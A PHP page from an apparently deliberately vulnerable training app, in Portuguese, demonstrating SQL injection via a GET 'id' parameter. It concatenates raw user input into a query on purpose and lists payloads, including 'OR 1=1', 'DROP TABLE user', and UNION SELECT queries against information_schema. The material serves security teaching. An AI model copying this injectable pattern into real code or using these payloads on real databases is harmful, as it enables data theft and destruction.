<?php
defined('APP') or die('Access denied');
include("db.php");
?>

<div class="container mt-4">
    <h3>🗄️ SQL Injection - GET Method</h3>

    <div class="alert alert-danger" role="alert">
        <strong>⚠️ Aviso:</strong> Esta página contém vulnerabilidades SQL para fins educacionais!
    </div>

    <div class="row">
        <div class="col-md-8">
            <div class="card">
                <div class="card-header">
                    <h5>Consulta de Usuários</h5>
                </div>
                <div class="card-body">
                    <p>Teste diferentes valores de ID para explorar a vulnerabilidade SQL:</p>

                    <form method="GET" class="mb-3">
                        <input type="hidden" name="page" value="sql-injection">
                        <div class="input-group">
                            <span class="input-group-text">ID:</span>
                            <input type="text" name="id" class="form-control" placeholder="Digite um ID ou payload SQL..." value="<?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : ''; ?>">
                            <button class="btn btn-primary" type="submit">Executar Query</button>
                        </div>
                    </form>

                    <h6>Exemplos Rápidos:</h6>
                    <div class="d-grid gap-2 d-md-block mb-3">
                        <a href="?page=sql-injection" class="btn btn-outline-primary btn-sm">📋 Todos os registros</a>
                        <a href="?page=sql-injection&id=3" class="btn btn-outline-success btn-sm">🔍 Filtrar por ID=3</a>
                        <a href='?page=sql-injection&id=3 union select 1, concat("%inicio%", database(), "%fim%" ), 2, 3' class="btn btn-outline-warning btn-sm">🗂️ Nome do banco</a>
                        <a href='?page=sql-injection&id=3 union select 1, concat("<b>", table_name, "</b>") ,2, 3 from information_schema.tables where table_schema=database()' class="btn btn-outline-info btn-sm">📊 Listar tabelas</a>
                    </div>
                </div>
            </div>

            <?php
            $where = "";
            if (isset($_GET['id'])) {
                $where = 'WHERE id = ' . $_GET['id'];
            }

            // Perform query
            $query = "SELECT * FROM user $where";

            echo "<div class='card mt-3'>";
            echo "<div class='card-header'>";
            echo "<h6>📊 Resultado da Query</h6>";
            echo "<small class='text-muted'>Query executada: <code>" . htmlspecialchars($query) . "</code></small>";
            echo "</div>";
            echo "<div class='card-body'>";

            if ($result = $mysqli->query($query)) {
                echo "<div class='alert alert-success' role='alert'>";
                echo "<strong>✅ Query executada com sucesso!</strong><br>";
                echo "Número de registros encontrados: <strong>{$result->num_rows}</strong>";
                echo "</div>";

                if ($result->num_rows > 0) {
                    echo "<div class='table-responsive'>";
                    echo "<table class='table table-striped table-hover'>";
                    echo "<thead class='table-dark'>";
                    echo "<tr>";

                    // Get column names dynamically
                    $fields = $result->fetch_fields();
                    foreach ($fields as $field) {
                        echo "<th>" . htmlspecialchars($field->name) . "</th>";
                    }
                    echo "</tr>";
                    echo "</thead>";
                    echo "<tbody>";

                    // Reset result pointer and display data
                    $result->data_seek(0);
                    foreach ($result as $row) {
                        echo "<tr>";
                        foreach ($row as $value) {
                            echo "<td>" . htmlspecialchars($value) . "</td>";
                        }
                        echo "</tr>";
                    }
                    echo "</tbody>";
                    echo "</table>";
                    echo "</div>";
                }

                $result->free_result();
            } else {
                echo "<div class='alert alert-danger' role='alert'>";
                echo "<strong>❌ Erro na query:</strong><br>";
                echo htmlspecialchars($mysqli->error);
                echo "</div>";
            }

            echo "</div>";
            echo "</div>";

            $mysqli->close();
            ?>
        </div>

        <div class="col-md-4">
            <div class="card">
                <div class="card-header">
                    <h6>💡 SQL Injection - GET Examples</h6>
                </div>
                <div class="card-body">
                    <div class="accordion" id="sqlExamples">
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingBasic">
                                <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapseBasic">
                                    Payloads Básicos
                                </button>
                            </h2>
                            <div id="collapseBasic" class="accordion-collapse collapse show" data-bs-parent="#sqlExamples">
                                <div class="accordion-body">
                                    <strong>Teste de injeção:</strong><br>
                                    <code>1 OR 1=1</code><br>
                                    <code>1' OR '1'='1</code><br>
                                    <code>1; DROP TABLE user; --</code><br><br>

                                    <strong>Comentários SQL:</strong><br>
                                    <code>1' --</code><br>
                                    <code>1' #</code><br>
                                    <code>1' /*comment*/</code>
                                </div>
                            </div>
                        </div>

                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingUnionGet">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseUnionGet">
                                    UNION SELECT
                                </button>
                            </h2>
                            <div id="collapseUnionGet" class="accordion-collapse collapse" data-bs-parent="#sqlExamples">
                                <div class="accordion-body">
                                    <strong>Descobrir colunas:</strong><br>
                                    <code>1 ORDER BY 1,2,3,4</code><br>
                                    <code>1 UNION SELECT 1,2,3,4</code><br><br>

                                    <strong>Extrair informações:</strong><br>
                                    <code>1 UNION SELECT 1,user(),version(),4</code><br>
                                    <code>1 UNION SELECT 1,database(),@@version,4</code>
                                </div>
                            </div>
                        </div>

                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingInfo">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseInfo">
                                    Information Schema
                                </button>
                            </h2>
                            <div id="collapseInfo" class="accordion-collapse collapse" data-bs-parent="#sqlExamples">
                                <div class="accordion-body">
                                    <strong>Listar bancos:</strong><br>
                                    <code>1 UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata</code><br><br>

                                    <strong>Listar colunas:</strong><br>
                                    <code>1 UNION SELECT 1,column_name,table_name,4 FROM information_schema.columns WHERE table_schema=database()</code>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
